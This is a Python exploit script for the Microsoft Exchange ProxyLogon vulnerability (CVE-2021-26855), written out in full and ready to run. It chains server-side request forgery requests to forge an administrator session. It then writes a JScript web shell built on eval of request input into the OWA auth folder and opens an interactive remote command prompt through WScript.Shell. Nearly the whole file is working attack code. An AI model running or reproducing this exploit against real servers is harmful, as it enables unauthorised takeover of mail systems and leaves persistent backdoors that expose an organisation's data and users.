#!/usr/bin/env python3
# CVE-2021-26855 - SSRF -> RCE
# ZephrFish 0.2

import requests
from urllib3.exceptions import InsecureRequestWarning
import random
import string
import sys
import time 


def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

if len(sys.argv) < 2:
    print("Usage Instructions: ")
    print("python ExchangeSheller.py <target> <email>")
    print("python ExchangeSheller.py mail.domain.com test2@domain.com")
    print("python ExchangeSheller.py 1.2.3.4 test2@domain.com")
    exit()

print("""
 _____         _                            
|  ___|       | |                           
| |____  _____| |__   __ _ _ __   __ _  ___ 
|  __\ \/ / __| '_ \ / _` | '_ \ / _` |/ _ |
| |___>  < (__| | | | (_| | | | | (_| |  __/
\____/_/\_\___|_| |_|\__,_|_| |_|\__, |\___|
                                  __/ |     
                                 |___/         
 __ _          _ _                          
/ _\ |__   ___| | | ___ _ __                
\ \| '_ \ / _ \ | |/ _ \ '__|               
_\ \ | | |  __/ | |  __/ |                  
\__/_| |_|\___|_|_|\___|_|                  

CVE-2021-26855 - SSRF to Shell
ExchangeSheller.py   - @ZephrFish  
                                            """)

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
target = sys.argv[1]
email = sys.argv[2]
random_name = id_generator(4) + ".js"
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"

shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\exchmshell.aspx"
shell_absolute_path = "\\\\127.0.0.1\\c$\\%s" % shell_path

shell_content = '<script language="JScript" runat="server"> function Page_Load(){/**/eval(Request["code"],"unsafe");}</script>'

autoDiscoverBody = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
      <EMailAddress>%s</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>
""" % email

print("[!] Discovering Exchange Server: " + target +"permission")
print("=============================")
FQDN = "EXCHANGE01"
ReqHAX = requests.get("https://%s/ecp/%s" % (target, random_name), headers={"Cookie": "X-BEResource=localhost~1942062522",
                                                                        "User-Agent": user_agent},
                  verify=False)

if "X-CalculatedBETarget" in ReqHAX.headers and "X-FEServer" in ReqHAX.headers:
    FQDN = ReqHAX.headers["X-FEServer"]


ReqHAX = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=%s/autodiscover/autodiscover.xml?a=~1942062522;" % FQDN,
    "Content-Type": "text/xml",
    "User-Agent": user_agent},
                   data=autoDiscoverBody,
                   verify=False
                   )

if ReqHAX.status_code != 200:
    print(ReqHAX.status_code)
    print("Autodiscover Error, please try a different email or re-run")
    exit()

if "<LegacyDN>" not in str(ReqHAX.content):
    print("Can not get LegacyDN :( !")
    exit()

legacyDn = str(ReqHAX.content).split("<LegacyDN>")[1].split(r"</LegacyDN>")[0]
print("Got DN: " + legacyDn)

mapi_body = legacyDn + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"

ReqHAX = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Administrator@%s:444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@exchange.lab&a=~1942062522;" % FQDN,
    "Content-Type": "application/mapi-http",
    "X-Requesttype": "Connect",
    "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
    "X-Clientapplication": "Outlook/15.0.4815.1002",
    "X-Requestid": "{E2EA6C1C-E61B-49E9-9CFB-38184F907552}:123456",
    "User-Agent": user_agent
},
                   data=mapi_body,
                   verify=False,

                   )
if ReqHAX.status_code != 200 or " act as owner of a UserMailbox" not in str(ReqHAX.content):
    print("Mapi Error!")
    exit()

sid = str(ReqHAX.content).split("with SID ")[1].split(" and MasterAccountSid")[0]

print("Got SID: " + sid)
sid = sid.replace(sid.split("-")[-1],"500")

proxyLogon_request = """<r at="Negotiate" ln="john"><s>%s</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>
""" % sid

ReqHAX = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Administrator@%s:444/ecp/proxyLogon.ecp?a=~1942062522;" % FQDN,
    "Content-Type": "text/xml",
    "msExchLogonMailbox": "S-1-5-20",
    "User-Agent": user_agent
},
                   data=proxyLogon_request,

                   verify=False
                   )
if ReqHAX.status_code != 241 or not "msExchEcpCanary=" in ReqHAX.headers["Set-Cookie"]:
    print("Proxylogon Error!")
    exit()

sess_id = ReqHAX.headers['set-cookie'].split("ASP.NET_SessionId=")[1].split(";")[0]

msExchEcpCanary = ReqHAX.headers['set-cookie'].split("msExchEcpCanary=")[1].split(";")[0]
print("Got session id: " + sess_id)
print("Got canary: " + msExchEcpCanary)

ReqHAX = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
        FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
    "Content-Type": "application/json; ",
    "msExchLogonMailbox": "S-1-5-20",
    "User-Agent": user_agent

},
                   json={"filter": {
                       "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                      "SelectedView": "", "SelectedVDirType": "All"}}, "sort": {}},
                   verify=False
                   )

if ReqHAX.status_code != 200:
    print("GetOAB Error!")
    exit()
oabId = str(ReqHAX.content).split('"RawIdentity":"')[1].split('"')[0]
print("Got OAB id: " + oabId)

oab_json = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
            "properties": {
                "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                               "ExternalUrl": "http://ffff/#%s" % shell_content}}}

ReqHAX = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
        FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
    "msExchLogonMailbox": "S-1-5-20",
    "Content-Type": "application/json; charset=utf-8",
    "User-Agent": user_agent
},
                   json=oab_json,
                   verify=False
                   )
if ReqHAX.status_code != 200:
    print("Set external url Error!")
    exit()

reset_oab_body = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
                  "properties": {
                      "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                     "FilePathName": shell_absolute_path}}}

ReqHAX = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
        FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
    "msExchLogonMailbox": "S-1-5-20",
    "Content-Type": "application/json; charset=utf-8",
    "User-Agent": user_agent
},
                   json=reset_oab_body,
                   verify=False
                   )

if ReqHAX.status_code != 200:
    print("Failed to write to the shell")
    exit()

print("Successful. Verify whether the shell has landed!")
print("POST  shell:https://"+target+"/owa/auth/exchmshell.aspx")
shell_url="https://"+target+"/owa/auth/exchmshell.aspx"
print('code=Response.Write(new ActiveXObject("WScript.Shell").exec("whoami").StdOut.ReadAll());')
print("Requesting shell")
data=requests.post(shell_url,data={"code":"Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"whoami\").StdOut.ReadAll());"},verify=False)
time.sleep(5)

if "OAB (Default Web Site)" not in data.text:
    print("Failed to write to shell, either server is not vulnerable or we reacted too quickly - Try again!")
else:
    print("Response: "+data.text.split('Name: ')[0])
    while True:
        cmd = input("/> ")
        data_body = requests.post(shell_url,data={"code":"Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"%s\").StdOut.ReadAll());"%(cmd)}, verify=False)
        if data_body.status_code != 200:
            print('(+) Something wrong, data exec_code is invalid')
        else:
            print(data_body.text.split('Name: ')[0])
